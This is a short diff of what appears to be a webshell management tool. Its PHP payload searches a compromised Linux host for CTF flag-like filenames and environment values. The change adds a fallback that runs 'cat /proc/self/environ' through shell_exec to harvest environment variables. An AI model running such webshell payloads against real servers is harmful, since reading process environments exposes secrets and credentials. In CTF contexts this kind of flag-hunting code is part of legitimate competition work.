@@ -340,7 +340,7 @@ array_push($infos, [
     "value" => implode(", ", get_loaded_extensions())
 ]);
 if (PHP_OS === 'Linux') {
-    $flags = "";
+    $flags = "| ";
     $regex = '/f[l1i]{1,10}[4a]{1,10}[9g]{1,10}|f.{10,100}/i';
     foreach (scandir("/") as $filename) {
         if (preg_match($regex, $filename)) {
@@ -358,6 +358,14 @@ if (PHP_OS === 'Linux') {
         if(preg_match($regex, $key)
         && preg_match("/.{1,10}\\{/i", $value)) {
             $flags .=  "env $key = $value | ";
+        }
+    }
+    if(!count($_ENV) and function_exists('shell_exec')) {
+        $lines = explode("\\x00", @shell_exec("cat /proc/self/environ"));
+        foreach($lines as $line) {
+            if(preg_match("/.{1,10}\\{/i", $line)) {
+                $flags .=  "env $line | ";
+            }
         }
     }
     if($flags) {
@@ -616,7 +624,6 @@ async def get_aes_key(pubkey, submitter):
 
 # 给前端显示的PHPWebshellOptions选项
 php_webshell_action_options = [
-
     ConnOption(
         id="updownload_chunk_size",
         name="文件上传下载分块大小",
